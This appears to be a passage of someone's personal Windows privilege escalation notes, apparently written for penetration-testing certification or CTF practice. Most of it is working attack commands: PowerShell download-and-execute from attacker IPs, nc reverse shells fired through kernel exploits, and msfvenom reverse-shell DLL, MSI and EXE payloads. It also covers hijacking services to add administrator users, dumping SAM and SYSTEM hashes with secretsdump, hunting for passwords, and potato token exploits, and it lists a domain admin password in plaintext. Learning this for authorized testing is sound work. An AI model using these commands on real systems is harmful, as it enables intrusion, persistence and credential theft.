/>net&nbsp;user&nbsp;&lt;username&gt;&nbsp;&amp;&nbsp;net&nbsp;localgroup&nbsp;administrators<br />systeminfo<br />	wmic&nbsp;os&nbsp;get&nbsp;osarchitecture&nbsp;&amp;&amp;&nbsp;wmic&nbsp;os&nbsp;get&nbsp;Caption<br />Dir&nbsp;Desktop,&nbsp;C,&nbsp;Program&nbsp;files,&nbsp;Program&nbsp;filesx86<br />WMIC&nbsp;/Node:localhost&nbsp;/Namespace:\\root\SecurityCenter2&nbsp;Path&nbsp;AntiVirusProduct&nbsp;Get&nbsp;displayName&nbsp;/Format:List<br />cmdkey&nbsp;/list<br />netstat&nbsp;-napo&nbsp;tcp<br />tasklist&nbsp;/v<br />set<br />wmic&nbsp;service&nbsp;where&nbsp;started=true&nbsp;get&nbsp;name,startname<br />#Strings&nbsp;on&nbsp;custom&nbsp;binaries</div></div><br /><br />Tools<br />	powerup.ps1<br />		powershell.exe -exec Bypass &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;<a href="http://10.9.0.59/PowerUp.ps1');">http://10.9.0.59/PowerUp.ps1&#39;);</a> Invoke-ALLCHECKS&quot; <br />		sharpup.exe (if you can&#39;t run powerup)<br />		sherlock.ps1 (if the machine is Win7 or older)<br />	winPEASany.exe<br />		.\winPEASany.exe quiet cmd fast 			(Fast check for lots &#39;o&#39; shit)<br />		<br />		.\winPEASany.exe quiet servicesinfo		(Check for Services) <br />		.\winPEASany.exe quiet applicationsinfo	(Check for AutoRun executables)<br />		.\winPEASany.exe quiet procesinfo			(Check for non-standard processes (I know it is spelt wrong))<br />		.\winPEASany.exe quiet windowscreds	(Search for Creds)<br />		.\winPEASany.exe quiet filesinfo userinfo	(More cred searching)<br />		.\winPEASany.exe quiet cmd systeminfo	(replaces watson and wes.py as far as I can tell)<br /><br />		.\winPEASany.bat (if .net4 or greater is not on the target)<br />	jaws.ps1 (payload all the things)<br />	SharpHound.ps1  &lt;if it is a dc especially<br />	wes.py<br />		pushd /Yeet/Skeet/wesng/ &amp;&amp; ./wes.py /Yeet/Machines/UPE/Tiberius_Windows/Systeminfo.txt -i &quot;Remote Code Execution&quot; &amp;&amp; popd<br />	accesschk.exe (Not a PE tool, but still handy)<br />		Service<br />			.\accesschk.exe /accepteula -uwcqv myusername daclsvc<br />		Directory	<br />			.\accesschk.exe /accepteula -uwdq &quot;C:\Program Files\&quot;	(or icacls c:\)<br />		File<br />			.\accesschk.exe /accepteula -quvw &quot;C:\Program Files\File Permissions Service\filepermservice.exe&quot;	(or icacls c:\file.exe)<br />		Reg Key	<br />			.\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc		(or get-acl hklm\...| Format-List)<br /><br />	Re-Check for Services, registry, Service accounts, installed applications, admin processes (with versions), forwardable internal ports, weird processes, other usernames, non-standard scheduled tasks, and startup applications.</div><div class='page'><h1 class='title level-4'>Manual Enumeration</h1><br/>System Enumeration<br />systeminfo<br />wmic qfe get Caption,Description,HotFixID,InstalledOn<br />wmic logicaldisk get caption,description,providername<br /><br />User Enumeration<br />whoami<br />whoami /priv<br />whoami /groups<br />net user<br />net user someguy<br />net user administrator<br />net localgroup<br />net localgroup administrators<br /><br />Network Enumeration<br />ipconfig /all<br />arp -a<br />route print<br />netstat -ano<br /><br />AV and Firewall<br />sc query windefend<br />sc queryex type=service<br />netsh advfirewall firewall dump<br />netsh firewall show state<br />netsh firewall show config<br /><br />Others<br />PS&gt; Get-ScheduledTask | where {$_.TaskPath -notlike &quot;\Microsoft*&quot;} | ft TaskName,TaskPath,State<br />&gt; tasklist /V<br />&gt; icacls.exe &quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup&quot;</div><div class='page'><h1 class='title level-4'>Resources</h1><br/><a href="https://github.com/frizb/Windows-Privilege-Escalationhttps://github.com/frizb/Windows-Privilege-Escalation">https://github.com/frizb/Windows-Privilege-Escalationhttps://github.com/frizb/Windows-Privilege-Escalation</a><br /><a href="https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html">https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html</a><br /><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md</a><br /><a href="https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation">https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation</a><br /><a href="https://medium.com/@sushantkamble/windows-privilege-escalation-without-metasploit-9bad5fbb5666">https://medium.com/@sushantkamble/windows-privilege-escalation-without-metasploit-9bad5fbb5666</a></div><div class='page'><h1 class='title level-3'>Methods</h1><br/></div><div class='page'><h1 class='title level-4'>Kernels</h1><br/>ms16-014 &lt; look into ~TCM</div><div class='page'><h1 class='title level-5'>ms10-015</h1><br/>ms10-015 kitrap0d | opens another shell, need metasploit</div><div class='page'><h1 class='title level-5'>ms10-059</h1><br/>ms10-059 chimmichurri | MS10-059.exe 10.10.14.3 3232 (catch with nc)</div><div class='page'><h1 class='title level-5'>ms15-051</h1><br/>.\ms15-051x64.exe &quot;nc.exe 10.10.14.7 3232 -e cmd.exe&quot;</div><div class='page'><h1 class='title level-5'>ms16-032</h1><br/>Invoke-MS16032.ps1 (From powershell empire. Needs two CPU&#39;s.)<br />C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe C:\Users\kostas\Downloads\Invoke-MS16032.ps1 Invoke-MS16032 -Command IEX(New-Object Net.WebClient).downloadString(&#39;<a href="http://10.10.14.60:8000/Sherlock.ps1')">http://10.10.14.60:8000/Invoke-PowerShellTcp.ps1&#39;)</a></div><div class='page'><h1 class='title level-5'>MS17-010</h1><br/><a href="https://medium.com/@ranakhalil101/hack-the-box-blue-writeup-w-o-metasploit-572c6042feb8">https://medium.com/@ranakhalil101/hack-the-box-blue-writeup-w-o-metasploit-572c6042feb8</a><br /><a href="https://null-byte.wonderhowto.com/how-to/manually-exploit-eternalblue-windows-server-using-ms17-010-python-exploit-0195414/">https://null-byte.wonderhowto.com/how-to/manually-exploit-eternalblue-windows-server-using-ms17-010-python-exploit-0195414/</a><br />^^these only work if the guest account is active OR you have a username with creds. Otherwise, use metasploits exploit/windows/smb/ms17_010_psexec<br /><br />if being used for privesc, to open port 445 to your kali<br />    put plink.exe on target machine<br />    plink -R 445:localhost:445 root@kaliip      to <strong>forward 445</strong> traffic on the <strong>localhost </strong>to 445 on <strong>10.11.0.186</strong>   <br />    nmap -p 445 127.0.0.1 to verify 445 connectivity</div><div class='page'><h1 class='title level-5'>CVE-2018-8120</h1><br/>CVE-2018-8120	.\x64.exe C:\RevShell.exe (catch with nc)	(Will probably work against every windows 7 box)</div><div class='page'><h1 class='title level-4'>Services</h1><br/>The common service misconfigurations are...<br />	1) Insecure Service Properties<br />	2) Unquoted Service Path.<br />	3) Weak Registry Permissions<br />	4) Insecure Service Executables<br />	5) DLL Hijacking<br /><br />-Note- In order to avoid the Rabbit Hole, Be sure you can start and stop the service (or that something is starting it periodically).<br /><br /><br /></div><div class='page'><h1 class='title level-5'>Insecure Service Properties (Writeable BinPath)</h1><br/>Writable BinPaths<br />	If you can write to the binpath of a service, you can change what it actually executes. (either an NC command, rev shell, or add a user to a group) <br />	.\accesschk64.exe /accepteula -uwcqv MyUsername NameOfService    (This will find if you can write to any binpaths)<br />	<br />	sc qc NameOfService		(Current config)	<br />	sc query NameOfService	(Status)<br />	sc config daclsvc binpath= &quot;net localgroup administrators MyUser /add&quot; (You can also point this to a revshell executable)<br />	sc start NameOfService</div><div class='page'><h1 class='title level-5'>Unquoted Service Path (Search Order Hijack)</h1><br/>Unquoted Service Paths<br />	Most tools will find these. If there are spaces in the name of a service executable windows will first search where there is a space plus .exe.<br />		example: C:\program files\service.exe  windows will first check for C:\program.exe.<br />	msfvenom -p windows/exec CMD=&#39;net localgroup administrators squid /add&#39; -f exe-service -o program.exe<br />	<br />	put program.exe at C:\program.exe<br />	sc start service</div><div class='page'><h1 class='title level-5'>Weak Registry Permissions (Overwrite D-Word)</h1><br/>Weak Registry Permissions<br />	The Windows registry stores entries for each service. Since registry entries can have ACLs, if the ACL is misconfigured, it may be possible to modify a service’s configuration even if we cannot modify the 	service directly. This can be verified with either...<br /><br />	PS&gt; Get-Acl HKLM:\System\CurrentControlSet\Services\regsvc | Format-List<br />	---or---<br />	&gt; .\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\ServiceRegKey<br /><br />	Overwrite the d-word and start the service<br /><br />	reg query HKLM\SYSTEM\CurrentControlSet\services\ServiceRegKey<br />	reg add HKLM\SYSTEM\CurrentControlSet\services\ServiceRegKey /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f<br />	sc start ServiceReg </div><div class='page'><h1 class='title level-5'>Insecure Service Executables (Overwrite .exe)</h1><br/>Service Executable Files<br />	.\accesschk64.exe -quvw /accepteula &quot;C:\Program Files\File Permissions Service&quot; 	(PowerUp is more likely to find this for you.)<br />	if the &quot;Everyone user group has &quot;FILE_ALL_ACCESS&quot; permission on a file for a service that is executed as an admin we can overwrite it with our own service executable (and hopefully start the service).<br />	windows_service.c is kept in the compiled binaries github<br />			Edit the line to change the commands you are going to run (probably add a user to the administrators group or run NC for a rev shell).<br />			example: cmd.exe /k net localgroup administrators squid /add<br />			compile it with     x86_64-w64-mingw32-gcc windows_service.c -o x.exe          (apt install gcc-mingw-w64)<br />			put x.exe on the target<br />	<br />	Backup the original file.	<br />	copy /y c:\Temp\x.exe &quot;c:\Program Files\File Permissions Service\filepermservice.exe&quot;<br />	sc start filepermsvc<br /><br />	---Note---Regular executables are sometimes fine. I am unsure as to what the delineation is.</div><div class='page'><h1 class='title level-5'>DLL Hijacking</h1><br/>DLL Hijacking<br />	Can be found via procmon. More than likely, this will be found with a tool if at all.<br />	A DLL Hijack occurs when an executable tries to load a dll that is not there.<br />	You will need to be able to write to that location and probably start the service.<br />	msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.9.0.59 -f dll -a x64 -o hijackme.dll  (arch is super important for dll&#39;s)<br />		or		windows_dll.c is kept in the compiled binaries github<br />				Edit the line to change the commands you are going to run (probably add a user to the administrators group or run NC for a rev shell).<br />				example: cmd.exe /k net localgroup administrators squid /add<br />				compile it with line from top of code (x86 or x64 is super important)          (apt install gcc-mingw-w64)<br />				put x.exe on the target<br />	sc stop dllsvc<br />	sc start dllsvc</div><div class='page'><h1 class='title level-4'>Registry</h1><br/>The common registry misconfigurations are...<br />	1) Autoruns<br />	2) AlwaysInstallElivated<br /></div><div class='page'><h1 class='title level-5'>AutoRun Keys</h1><br/>If one of these are writeable, most tools will find it. If you wanted to do it manually...<br />	reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run and then .\accesschk.exe /accepteula -wvu &quot;C:\Program Files\Autorun Program\program.exe&quot;<br />Then overwrite the executable with your own.<br />	copy /Y C:\PrivEsc\reverse.exe &quot;C:\Program Files\Autorun Program\program.exe&quot;<br /><br /><br />Below is a long ass list of AutoRun Keys. Most of them run at startup or login. If you can add/change the value of a key, you may be able to privesc. -Note-Many keys respond to weird variables. For example the Run key runs as the user whom was last logged in (weird right?).<br /><br />::<br />:: These registry key locations were copied directly from the Everything tab in SysInternals&#39; Autoruns<br />::==================================================================================================<br />::<br />:: Windows Kernel 5 (2k/xp)<br />::<br /><br />\HKCU\Software\Policies\Microsoft\Windows\System\Scripts\Logoff<br />\HKCU\Software\Microsoft\Windows\CurrentVersion\Group Policy\Scripts\Startup<br />\HKCU\Software\Microsoft\Windows\CurrentVersion\Group Policy\Scripts\Shutdown<br />\HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\Shell<br />\HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell<br />\HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load<br />\HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Run<br />\HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run<br />\HKCU\Software\Microsoft\Windows\CurrentVersion\Run<br />\HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce<br />\HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce<br />\HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx<br />\HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run<br />\HKCU\SOFTWARE\Classes\Protocols\Filter<br />\HKCU\SOFTWARE\Classes\Protocols\Handler<br />\HKCU\SOFTWARE\Microsoft\Internet Explorer\Desktop\Components<br />\HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components<br />\HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad<br />\HKCU\Software\Classes\*\ShellEx\ContextMenuHandlers<br />\HKCU\Software\Classes\AllFileSystemObjects\ShellEx\ContextMenuHandlers<br />\HKCU\Software\Classes\Directory\ShellEx\ContextMenuHandlers<br />\HKCU\Software\Classes\Directory\Shellex\DragDropHandlers<br />\HKCU\Software\Classes\Directory\Shellex\PropertySheetHandlers<br />\HKCU\Software\Classes\Directory\Shellex\CopyHookHandlers<br />\HKCU\Software\Classes\Folder\Shellex\ColumnHandlers<br />\HKCU\Software\Classes\Folder\ShellEx\ContextMenuHandlers<br />\HKCU\Software\Classes\Directory\Background\ShellEx\ContextMenuHandlers<br />\HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ShellIconOverlayIdentifiers<br />\HKCU\Software\Microsoft\Ctf\LangBarAddin<br />\HKCU\Software\Microsoft\Windows\CurrentVersion\Shell Extensions\Approved<br />\HKCU\Software\Microsoft\Internet Explorer\UrlSearchHooks<br />\HKCU\Software\Microsoft\Internet Explorer\Explorer Bars<br />\HKCU\Software\Microsoft\Internet Explorer\Extensions<br />\HKCU\Software\Microsoft\Windows NT\CurrentVersion\Drivers32<br />\HKCU\Software\Classes\Filter<br />\HKCU\Software\Microsoft\Command Processor\Autorun<br />\HKCU\SOFTWARE\Classes\Exefile\Shell\Open\Command\(Default)<br />\HKCU\Software\Classes\.exe<br />\HKCU\Software\Classes\.cmd<br />\HKCU\SOFTWARE\Policies\Microsoft\Windows\Control Panel\Desktop\Scrnsave.exe<br />\HKCU\Control Panel\Desktop\Scrnsave.exe<br /><br />\HKLM\System\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\StartupPrograms<br />\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AppSetup<br />\HKLM\Software\Policies\Microsoft\Windows\System\Scripts\Startup<br />\HKLM\Software\Policies\Microsoft\Windows\System\Scripts\Logon<br />\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit<br />\HKLM\Software\Policies\Microsoft\Windows\System\Scripts\Shutdown<br />\HKLM\Software\Policies\Microsoft\Windows\System\Scripts\Logoff<br />\HKLM\Software\Microsoft\Windows\CurrentVersion\Group Policy\Scripts\Startup<br />\HKLM\Software\Microsoft\Windows\CurrentVersion\Group Policy\Scripts\Shutdown<br />\HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Shell<br />\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell<br />\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Taskman<br />\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce<br />\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx<br />\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run<br />\HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run<br />\HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx<br />\HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce<br />\HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run<br />\HKLM\SOFTWARE\Classes\Protocols\Filter<br />\HKLM\SOFTWARE\Classes\Protocols\Handler<br />\HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components<br />\HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\SharedTaskScheduler<br />\HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad<br />\HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\ShellExecuteHooks<br />\HKLM\Software\Classes\*\ShellEx\ContextMenuHandlers<br />\HKLM\Software\Classes\AllFileSystemObjects\ShellEx\ContextMenuHandlers<br />\HKLM\Software\Classes\Directory\ShellEx\ContextMenuHandlers<br />\HKLM\Software\Classes\Directory\Shellex\DragDropHandlers<br />\HKLM\Software\Classes\Directory\Shellex\PropertySheetHandlers<br />\HKLM\Software\Classes\Directory\Shellex\CopyHookHandlers<br />\HKLM\Software\Classes\Folder\Shellex\ColumnHandlers<br />\HKLM\Software\Classes\Folder\ShellEx\ContextMenuHandlers<br />\HKLM\Software\Classes\Directory\Background\ShellEx\ContextMenuHandlers<br />\HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\ShellIconOverlayIdentifiers<br />\HKLM\Software\Microsoft\Ctf\LangBarAddin<br />\HKLM\Software\Microsoft\Windows\CurrentVersion\Shell Extensions\Approved<br />\HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects<br />\HKLM\Software\Microsoft\Internet Explorer\Toolbar<br />\HKLM\Software\Microsoft\Internet Explorer\Explorer Bars<br />\HKLM\Software\Microsoft\Internet Explorer\Extensions<br />\HKLM\System\CurrentControlSet\Services<br />\HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32<br />\HKLM\Software\Classes\Filter<br />\HKLM\Software\Classes\CLSID\{083863F1-70DE-11d0-BD40-00A0C911CE86}\Instance<br />\HKLM\Software\Classes\CLSID\{AC757296-3522-4E11-9862-C17BE5A1767E}\Instance<br />\HKLM\Software\Classes\CLSID\{7ED96837-96F0-4812-B211-F13C24117ED3}\Instance<br />\HKLM\Software\Classes\CLSID\{ABE3B9A4-257D-4B97-BD1A-294AF496222E}\Instance<br />\HKLM\System\CurrentControlSet\Control\Session Manager\BootExecute<br />\HKLM\System\CurrentControlSet\Control\Session Manager\SetupExecute<br />\HKLM\System\CurrentControlSet\Control\Session Manager\Execute<br />\HKLM\System\CurrentControlSet\Control\Session Manager\S0InitialCommand<br />\HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options<br />\HKLM\Software\Microsoft\Command Processor\Autorun<br />\HKLM\SOFTWARE\Classes\Exefile\Shell\Open\Command\(Default)<br />\HKLM\Software\Classes\.exe<br />\HKLM\Software\Classes\.cmd<br />\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\Appinit_Dlls<br />\HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls<br />\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\ServiceControllerStart<br />\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\LsaStart<br />\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\System<br />\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\UIHost<br />\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify<br />\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\GinaDLL<br />\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Taskman<br />\HKLM\System\CurrentControlSet\Control\BootVerificationProgram\ImagePath<br />\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SaveDumpStart<br />\HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\Protocol_Catalog9\Catalog_Entries<br />\HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries<br />\HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors<br />\HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SecurityProviders<br />\HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Authentication Packages<br />\HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Notification Packages<br />\HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages<br />\HKLM\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order<br />::==================================================================================================<br />::<br />:: Windows Kernel 6 (vista/7/8x)<br />::<br />HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run	<br />HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components<br />HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components			<br />HKLM\SOFTWARE\Classes\Protocols\Filter			<br />HKLM\Software\Classes\*\ShellEx\ContextMenuHandlers			<br />HKLM\Software\Wow6432Node\Classes\*\ShellEx\ContextMenuHandlers			<br />HKLM\Software\Classes\Directory\ShellEx\ContextMenuHandlers<br />HKLM\Software\Wow6432Node\Classes\Directory\ShellEx\ContextMenuHandlers			<br />HKLM\Software\Classes\Directory\Shellex\DragDropHandlers<br />HKLM\Software\Classes\Directory\Shellex\CopyHookHandlers	<br />HKLM\Software\Wow6432Node\Classes\Directory\Shellex\CopyHookHandlers			<br />HKLM\Software\Classes\Directory\Background\ShellEx\ContextMenuHandlers			<br />HKLM\Software\Wow6432Node\Classes\Directory\Background\ShellEx\ContextMenuHandlers			<br />HKLM\Software\Wow6432Node\Classes\Folder\Shellex\ColumnHandlers			<br />HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects			<br />HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects			<br />Task Scheduler			<br />HKLM\System\CurrentControlSet\Services			<br />HKLM\System\CurrentControlSet\Services	<br />HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32			<br />HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32			<br />HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\Protocol_Catalog9\Catalog_Entries			<br />HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\Protocol_Catalog9\Catalog_Entries64	</div><div class='page'><h1 class='title level-5'>AlwaysInstallElivated</h1><br/>MSI files are package files used to install applications. These files run with the permissions of the user trying to install them. Windows allows for these installers to be run with elevated (i.e. admin) privileges. If this is the case, we can generate a malicious MSI file that contains a reverse shell. Two keys must be set to &quot;1&quot; for this to work.<br />HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer<br />---AND---<br />HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer<br /><br />&gt; reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated<br />&gt; reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated<br /># msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.11 LPORT=53 -f msi -o reverse.msi<br />&gt; msiexec /quiet /qn /i C:\PrivEsc\reverse.msi</div><div class='page'><h1 class='title level-4'>Passwords</h1><br/></div><div class='page'><h1 class='title level-5'>Manual Password Hunting</h1><br/>Password Hunting<br />&gt; dir /s *pass* == *.config<br />&gt; findstr /si password *.txt *.ini *.config *.xml    <br /><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---looting-for-passwords">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---looting-for-passwords</a><br /><a href="https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html">https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html</a><br />type C:\Windows\Panther\Unattend.xml (base64 between &lt;value&gt; tags.<br /><br />&gt; reg query HKLM /f password /t REG_SZ /s<br />&gt; reg query HKCU /f password /t REG_SZ /s<br /><br />&gt; cmdkey /list			(see runas)<br />&gt; type C:\Windows\Panther\Unattend.xml<br /><br />Base64 decode on kali<br /># echo &quot;cGFzc3dvcmQxMjM=&quot; | base64 -d</div><div class='page'><h1 class='title level-5'>SAM and SYSTEM</h1><br/>The SAM file is where Windows stores password hashes. The SAM is a database file. The hash key can be found in the SYSTEM file. The SAM and SYSTEM files are located in the C:\Windows\System32\config directory. The files are locked while Windows is running. Backups of the files may exist in the C:\Windows\Repair or C:\Windows\System32\config\RegBack directories. You&#39;ll be able to dump passwords if you can read both files. <br /><br />C:\&gt; reg.exe save hklm\sam c:\temp\sam.save<br />C:\&gt; reg.exe save hklm\security c:\temp\security.save<br />C:\&gt; reg.exe save hklm\system c:\temp\system.save<br /><br />&gt;move the files to the kali box<br /><br />secretsdump.py -sam sam.save -security security.save -system system.save LOCAL<br /><br /><a href="https://securusglobal.com/community/2013/12/20/dumping-windows-credentials/">https://securusglobal.com/community/2013/12/20/dumping-windows-credentials/</a><br />secretsdump.py megabank.local/administrator:&#39;d0m@in4dminyeah!&#39;@10.10.10.172<br /><br />c:\windows\system32\config<br />    sam (user database)<br />    system  registry hives (hklm) (system boot key)<br />    ntds.dit if it is a dc<br />    <br />Tool for windows 10.<br />	# git clone <a href="https://github.com/Neohapsis/creddump7.git">https://github.com/Neohapsis/creddump7.git</a><br />	# python3 /usr/share/creddump7/pwdump.py SYSTEM SAM<br />	# hashcat -m 1000 --force a9fdfa038c4b75ebc76dc855dd74f0da /usr/share/wordlists/rockyou.txt<br /></div><div class='page'><h1 class='title level-4'>Scheduled Tasks</h1><br/>Schtasks are normally run as the user who created it, but administrators can make tasks that run as other users or even system. I don&#39;t know of a good way to enumerate this. Paging through the non-microsoft ones might get you there.<br /><br />PS&gt; Get-ScheduledTask | where {$_.TaskPath -notlike &quot;\Microsoft*&quot;} | ft TaskName,TaskPath,State<br />&gt; .\accesschk.exe /accepteula -quvw MyUsername C:\file.ps1<br /><br />If you can edit the file, overwrite it or append to it and win the war.</div><div class='page'><h1 class='title level-4'>Insecure GUI Apps</h1><br/>&gt; tasklist /V<br />If a program runs as admin and you can use it, you may be able to privesc with it using something similar to the hhupd.exe method (mspaint is an easy example aswell).</div><div class='page'><h1 class='title level-4'>Startup Applications</h1><br/>StartUp Applications<br />	icacls.exe &quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup&quot; (PowerUp will not find this)<br />	if the BUILTIN\Users group has full access &#39;(F)&#39; to the directory, you will be able to put a file there (rev shell more than likley). When a user logs on (potentially an admin) you can spawn a shell as them.<br />	msfvenom -p windows/meterpreter/reverse_tcp LHOST=[Kali VM IP Address] -f exe -o x.exe<br />	<br />There are directories that run everything inside of them at specified times (Mostly Logins). C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp directory will run everything inside of it at login as the user who logged in. Only .lnk files will be run (I&#39;ve been told but experienced it be not true).<br />	<br />&gt; .\accesschk.exe /accepteula -d &quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp&quot;<br />	<br />VBScript to create a shortcut file<br />	Set oWS = WScript.CreateObject(&quot;WScript.Shell&quot;)<br />	sLinkFile = &quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk&quot;<br />	Set oLink = oWS.CreateShortcut(sLinkFile)<br />	oLink.TargetPath = &quot;C:\PrivEsc\reverse.exe&quot;<br />	oLink.Save<br />cscript CreateShortcut.vbs<br /></div><div class='page'><h1 class='title level-4'>Installed Applications</h1><br/>If you find a non-standard running process via a scan like &quot;winPEASany.exe silent procesinfo, run the executable with /? or -h to get a look at what it might do. Also be sure to check if there is an entry for it on Exploit-DB.</div><div class='page'><h1 class='title level-4'>Hotpotato</h1><br/>The attack tricks Windows into authenticating as the SYSTEM user to a fake HTTP server using NTLM. The NTLM credentials then get relayed to SMB in order to gain command execution.<br /><br />.\potato.exe -ip 192.168.11.9 -cmd &quot;C:\\users\\user\\desktop\\Shell.exe&quot; -enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true<br /><br /><a href="https://github.com/foxglovesec/Potato">https://github.com/foxglovesec/Potato</a><br /><a href="https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html">https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html</a></div><div class='page'><h1 class='title level-4'>Token Impersonation</h1><br/>If you have either of these tokens (whoami /groups) you may be able to use a potato exploit (most common in service accounts).<br />	SeImpersonatePrivilege          &gt; Rotten potato or Juicy potato<br />	SeAssignPrimaryPrivilege        &gt; Juicy potato<br />	Newer Than Win10 1809		 &gt; Rogue potato or PrintSpoofer.exe<br />	SeBackupPrivilege					 &gt; Read access to all files on the system (sam + system = PTH attack)<br />	SeRestorePrivilege					 &gt; Write access to all objects on the system (Modify both reg keys to allow <a href="PrivEsc--Windows_PrivEsc--Methods--Registry--AlwaysInstallElivated.html">AlwaysInstallElivated</a>)<br />	SeTakeOwnershipPrivilege		 &gt; Lets you take ownership over all objects on the system. (WRITE_OWNER permission) Own an object, give yourself write access, do the thing (Modify both reg keys to allow <a href="PrivEsc--Windows_PrivEsc--Methods--Registry--AlwaysInstallElivated.html">AlwaysInstallElivated</a>)<br />	SeDebug								 &gt; mimikatz/kiwi<br /><br 